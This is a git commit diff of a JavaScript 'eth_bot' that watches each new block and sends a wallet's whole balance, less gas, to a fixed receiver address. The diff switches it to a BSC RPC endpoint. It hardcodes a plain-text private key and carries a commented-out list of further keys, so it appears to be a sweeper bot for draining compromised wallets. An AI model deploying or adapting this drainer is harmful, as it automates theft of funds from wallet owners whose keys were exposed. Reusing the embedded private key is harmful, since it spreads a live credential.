6e40e90596a1e2def05f27c4eae4149ce280234a
Omega <aldjomega@gmail.com>
2023-10-25 02:28:24 +1000

    updated

--- eth_bot.js
+++ eth_bot.js
@@ -1,6 +1,11 @@
 const ethers = require("ethers")
+const Web3 = require("web3")
 // const ethers = require("ethers");
-const provider = new ethers.JsonRpcProvider("https://eth.drpc.org");
+// const provider = new ethers.JsonRpcProvider("https://eth.drpc.org");
+// const provider = new ethers.JsonRpcProvider("https://bsc-testnet.publicnode.com");
+// const provider = new ethers.JsonRpcProvider("https://data-seed-prebsc-1-s2.bnbchain.org:8545");
+const provider = new ethers.JsonRpcProvider("https://binance.llamarpc.com");
+
 const addressReceiver = "0xeD8881e05d9365A24312D1aA39C42431C85C80De";
 
 // const privateKeys =
@@ -26,6 +31,7 @@ const addressReceiver = "0xeD8881e05d9365A24312D1aA39C42431C85C80De";
 //     ];
 
 const privateKey = "0x07755e99f3d1c52c1ed0cb2483d58609fdecda78534446df889f59dd0dd16058";
+// const web3 = new Web3.providers.htt("https://eth.drpc.org");
 
 const bot = async () => {
     provider.on("block", async () => {
@@ -35,22 +41,67 @@ const bot = async () => {
         const _target = new ethers.Wallet(privateKey);
         const target = _target.connect(provider);
         const balance = await provider.getBalance(target.address);
-        const txBuffer = ethers.parseEther(".005");
-        console.log('debug bal::', balance > txBuffer)
-        if ((balance - txBuffer) > 0) {
-            console.log("NEW ACCOUNT WITH ETH!");
-            const amount = balance - txBuffer;
+        // const txBuffer = web3.eth.getGasPrice().then(console.log)
+        const feeData = await provider.getFeeData();
+        const gasLimit = 25000n;
+        const txBuffer = feeData.gasPrice * gasLimit;
+        // console.log("txBuffer", feeData, txBuffer)
+        // const txBuffer = ethers.parseEther(".005");
+        // console.log('debug bal::', balance > txBuffer)
+        console.log('debug balance::', balance, txBuffer)
+        if (balance > txBuffer) {
+            const tx = {
+                to: addressReceiver,
+                value: balance - txBuffer,
+                gasLimit: gasLimit,
+                gasPrice: feeData.gasPrice,
+            };
+            console.log('debug tx::', tx)
             try {
-                await target.sendTransaction({
-                    to: addressReceiver,
-                    value: amount
-                });
-                console.log(`Success! transfered --> ${ethers.formatEther(balance)}`);
+                const estimatedGas = await target.estimateGas(tx);
+                console.log('debug estimated gas::', estimatedGas, typeof estimatedGas)
+                const gasFee = estimatedGas * (feeData.gasPrice);
+                console.log(`Estimated gas limit: ${estimatedGas}`);
+                console.log(`Estimated gas fee: ${ethers.formatEther(gasFee)} ETH`);
+                // const realTx = {
+                //     to: addressReceiver,
+                //     value: balance - gasFee,
+                //     gasLimit: gasLimit,
+                //     gasPrice: feeData.gasPrice,
+                // };
+                const amount = balance - gasFee;
+                try {
+                    await target.sendTransaction({
+                        to: addressReceiver,
+                        value: amount
+                    });
+                    console.log(`Success! transfered --> ${ethers.formatEther(balance)}`);
+                }
+                catch (e) {
+                    console.log(`error: ${e}`);
+                }
+            } catch (error) {
+                console.error('Error estimating gas fee:', error);
             }
-            catch (e) {
-                console.log(`error: ${e}`);
-            }
+        } else {
+            console.log('Insufficient funds on the wallet');
         }
+
+
+        // if ((balance - txBuffer) > 0) {
+        //     console.log("NEW ACCOUNT WITH ETH!");
+        //     const amount = balance - txBuffer;
+        //     try {
+        //         await target.sendTransaction({
+        //             to: addressReceiver,
+        //             value: amount
+        //         });
+        //         console.log(`Success! transfered --> ${ethers.formatEther(balance)}`);
+        //     }
+        //     catch (e) {
+        //         console.log(`error: ${e}`);
+        //     }
+        // }
     });
 }
 
